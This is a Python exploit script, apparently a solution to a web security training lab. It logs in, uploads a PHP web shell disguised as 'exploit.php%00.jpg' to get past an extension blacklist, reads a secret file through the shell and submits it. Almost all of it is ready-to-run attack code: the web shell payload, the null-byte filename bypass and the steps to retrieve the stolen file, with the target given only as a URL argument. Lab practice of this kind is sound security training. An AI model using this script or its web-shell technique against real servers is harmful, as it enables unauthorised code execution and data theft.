"""
    Lab: Web shell upload via obfuscated file extension

    This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.
    To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
    You can log in to your own account using the following credentials: wiener:peter

    Exploit Steps:
    1. Log in to the application using the provided credentials.
    2. Attempt to upload a PHP web shell with a null byte obfuscation technique.
    3. Use the web shell to read the contents of the file /home/carlos/secret.
    4. Submit the contents of the secret file using the button provided in the lab banner.

    Author: N00BCYB0T
"""

import argparse
import re
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = None

def main():
    global URL

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target-lab.com)')
    parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    URL = args.url.rstrip('/')
    session = requests.Session()
    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False

    print(f"{Fore.YELLOW}[*] Getting CSRF token and logging in...{Fore.RESET}")
    csrf_token = get_csrf(session, "/login")
    login_data = {
        "username": "wiener",
        "password": "peter",
        "csrf": csrf_token
    }
    r = session.post(f"{URL}/login", data=login_data, allow_redirects=True)
    if "Your username is: wiener" not in r.text:
        print(f"{Fore.RED}[-] Login failed{Fore.RESET}")
        return
    print(f"{Fore.GREEN}[+] Logged in as wiener{Fore.RESET}")

    print(f"{Fore.YELLOW}[*] Uploading PHP web shell with null byte obfuscation...{Fore.RESET}")
    csrf_token = get_csrf(session, "/my-account")
    php_shell_content = b"<?php echo file_get_contents('/home/carlos/secret'); ?>"
    files = {
        "avatar": ("exploit.php%00.jpg", php_shell_content, "image/jpeg")
    }
    data = {
        "csrf": csrf_token,
        "user": "wiener"
    }
    r = session.post(f"{URL}/my-account/avatar", files=files, data=data, allow_redirects=True)
    if r.status_code != 200:
        print(f"{Fore.RED}[-] PHP web shell upload failed{Fore.RESET}")
        return
    print(f"{Fore.GREEN}[+] Uploaded PHP web shell{Fore.RESET}")

    print(f"{Fore.YELLOW}[*] Accessing uploaded shell...{Fore.RESET}")
    r = session.get(f"{URL}/files/avatars/exploit.php")
    secret = r.text.strip()
    if not secret or "<" in secret:
        print(f"{Fore.RED}[-] Failed to get secret from shell{Fore.RESET}")
        return
    print(f"{Fore.GREEN}[+] Got secret: {secret}{Fore.RESET}")

    print(f"{Fore.YELLOW}[*] Submitting solution...{Fore.RESET}")
    session.post(f"{URL}/submitSolution", data={"answer": secret, "csrf": csrf_token})
    solved = session.get(f"{URL}/")
    if "Congratulations, you solved the lab!" in solved.text:
        print(f"{Fore.GREEN}[+] Lab solved!{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Failed to solve the lab{Fore.RESET}")

def get_csrf(session, page):
    r = session.get(f"{URL}{page}")
    m = re.search(r'csrf" value="(.+?)"', r.text)
    if not m:
        print(f"{Fore.RED}[-] CSRF token not found on {page}{Fore.RESET}")
        exit(1)
    return m.group(1)

if __name__ == "__main__":
    main()